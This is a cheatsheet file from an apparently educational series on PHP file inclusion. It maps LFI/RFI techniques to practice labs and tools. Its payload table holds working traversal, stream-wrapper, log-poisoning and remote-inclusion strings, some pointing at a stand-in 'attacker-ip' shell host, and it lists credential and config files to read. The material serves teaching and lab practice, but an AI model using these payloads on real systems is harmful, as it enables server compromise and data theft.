# 06 — Cheatsheet & Lab Mapping

## 1. Payload cheatsheet

Every entry here is explained in full in files 2–5. This table is for quick
reference once you already understand the mechanism — don't use it as a
substitute for reading those files first.

| Technique | Payload pattern | Requires | File |
|---|---|---|---|
| Basic traversal read | `?page=../../../../etc/passwd` | Vulnerable `include()`/`require()`, no extension forcing or bypassable | 02 |
| Null byte truncation (legacy) | `?page=../../../../etc/passwd%00` | PHP < 5.3.4 | 02 |
| Path truncation (legacy) | `?page=../etc/passwd/././././...` (padded to exceed `PATH_MAX`) | Old PHP, long-path silent truncation bug | 02 |
| Source disclosure | `?page=php://filter/convert.base64-encode/resource=config` | None (works by default) | 03 |
| Filter-chain RCE | `?page=php://filter/<generated chain>/resource=php://temp` | None (use `php_filter_chain_generator`) | 03 |
| `php://input` RCE | `POST ?page=php://input` + PHP code as POST body | Request body not pre-consumed by framework | 03 |
| `data://` RCE | `?page=data://text/plain;base64,<base64 PHP>` | `allow_url_fopen` **and** `allow_url_include` | 03 |
| `expect://` RCE | `?page=expect://id` | `expect` PECL extension installed | 03 |
| Access log poisoning | Poison `User-Agent`, then `?page=/var/log/.../access.log&c=id` | Web user has read access to log path | 04 |
| Session poisoning | Poison a reflected session field, then `?page=<session.save_path>/sess_<id>&c=id` | App reflects input into `$_SESSION` | 04 |
| `/proc/self/environ` poisoning | Poison `User-Agent`, then `?page=/proc/self/environ&c=id` | CGI/mod_php worker-per-request model (rare in `php-fpm` setups) | 04 |
| Classic RFI | `?page=http://attacker-ip/shell.php&c=id` | `allow_url_fopen` **and** `allow_url_include` | 05 |
| Windows UNC/SMB RFI | `?page=\\attacker-ip\share\shell` | Windows-hosted PHP, SMB egress allowed | 05 |

## 2. Sensitive file disclosure targets (quick list)

**Linux**

- `/etc/passwd`, `/etc/hosts`, `/etc/hostname`
- `/proc/self/environ`, `/proc/self/cmdline`
- `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`
- App configs: `wp-config.php` (WordPress), `configuration.php` (Joomla), `.env` (most modern frameworks), generic `config.php`/`settings.php`

**Windows**

- `C:\Windows\System32\drivers\etc\hosts`
- `C:\inetpub\wwwroot\web.config`
- Application-specific config files (locations vary by stack)

## 3. Honest PortSwigger Web Security Academy lab mapping

This is the part of this file where this series departs from "here are labs
to practice on" and instead gives you the accurate picture, because the
accurate picture matters more than a tidy-looking table.

**PortSwigger Web Security Academy has no "File Inclusion" topic.** Its full
topic list runs: SQL injection, XSS, CSRF, Clickjacking, CORS, XXE, SSRF,
Request smuggling, Command injection, Server-side template injection,
Insecure deserialization, **Path traversal**, Access control, Authentication,
OAuth, Business logic, WebSockets, DOM-based, Web cache poisoning, HTTP Host
header attacks, Information disclosure, File upload vulnerabilities, JWT
attacks, Prototype pollution, GraphQL, Race conditions, NoSQL injection, API
testing, Web LLM attacks, Web cache deception. File Inclusion is not a
category, and there is no lab anywhere on the platform involving `include()`/
`require()` execution semantics, PHP stream wrappers, log/session poisoning,
or RFI.

The closest available topic is **Path Traversal**, and it is only a partial
analog — every lab in that topic exercises the **file-read primitive only**
(passing a filename into a function like `file_get_contents()` or an image
display handler), never an inclusion function that actually executes the
target file's contents. Working through them is genuinely useful for
sharpening traversal-sequence and filter-bypass instincts that transfer
directly to file 2 of this series, but **none of them touch any technique
from files 3, 4, or 5.**

In Academy's own sequence, the Path Traversal labs are:

1. **Lab: File path traversal, simple case** — unfiltered traversal sequences. Maps to file 2, section 2 of this series (basic traversal) directly.
2. **Lab: File path traversal, traversal sequences blocked with absolute path bypass** — maps to general filter-bypass thinking referenced in file 2; the specific bypass (supplying the expected base directory followed by traversal sequences) is a path-traversal-filter-evasion technique rather than an inclusion-specific one.
3. **Lab: File path traversal, validation of start of path** — same category as above.
4. **Lab: File path traversal, traversal sequences stripped non-recursively** — bypassing naive single-pass sanitization (e.g. nested sequences like `....//` that revert to `../` once one layer of stripping is applied); good general bypass-thinking practice, not inclusion-specific.
5. **Lab: File path traversal, traversal sequences stripped with superfluous URL-decode** — double-decoding bypass; same category.
6. **Lab: File path traversal, validation of file extension with null byte bypass** — this one is the closest direct overlap with this series: it's the null-byte-truncation concept from file 2, section 3, applied to traversal rather than inclusion. Worth doing specifically because it reinforces that exact mechanism, even though the underlying function in the lab isn't `include()`.

A loosely related lab outside the Path Traversal topic, in **File upload
vulnerabilities**: **Lab: Web shell upload via path traversal** — this
combines an upload primitive with a traversal bypass to place a `.php` web
shell where it will be served and executed by the web server. It's adjacent
to this series' theme (getting attacker code executed via a file-path bug)
but the execution mechanism is the web server serving an uploaded file
directly, not an `include()`/`require()` inclusion bug — closer to File
Upload Vulnerabilities than to File Inclusion proper. Worth doing for the
broader "path bug → code execution" intuition, with that distinction kept
clear in your notes.

**What Academy gives you no practice for at all:** `php://filter` source
disclosure or filter-chain RCE, `php://input` execution, `data://` execution,
`expect://`, log poisoning, session poisoning, `/proc/self/environ`
poisoning, and both forms of RFI. This is the entire core of files 3, 4, and
5 of this series — i.e., everything that turns LFI from a read primitive into
RCE.

**Where to actually get hands-on practice for those techniques instead:**
deliberately vulnerable platforms built specifically around classic PHP
inclusion bugs are the realistic option — environments such as DVWA, bWAPP,
and Metasploitable's bundled web apps include LFI/RFI scenarios with the
wrapper- and poisoning-based techniques this series covers, and TryHackMe and
HackTheBox both have rooms/boxes purpose-built around this vulnerability
class. None of that is PortSwigger Academy, and it's worth being clear-eyed
about that gap rather than implying Academy coverage that doesn't exist.

## 4. Automation tooling

- **fimap** — automates discovery of LFI/RFI parameters and attempts common
  bypasses against them; useful for initial recon across a large attack
  surface, less useful for the more advanced wrapper-chain techniques in
  file 3, which it doesn't construct for you.
- **kadimus** — similar discovery/exploitation automation focus, with
  built-in support for several of the poisoning techniques in file 4.
- **php_filter_chain_generator** — the tool referenced in file 3, section 2;
  given a target PHP payload, it searches for a `php://filter` chain that
  produces it. This is the practical way to actually use filter-chain RCE —
  treat hand-constructing a chain as a non-goal.
- **LFISuite** — an older, broader automation tool combining scanning and
  exploitation attempts across several techniques in this series; useful as
  a reference for technique coverage even where you end up running individual
  steps manually for precision.
- **Impacket's `smbserver.py`** — referenced in file 5 for the Windows
  UNC/SMB RFI technique; quickly stands up a throwaway SMB share to host a
  payload for a Windows target to fetch.

As with every series in this repository: run automation to confirm and speed
up what you already understand manually. If a tool reports a finding you
can't explain the mechanism for, go back to the relevant file in this series
before reporting it.
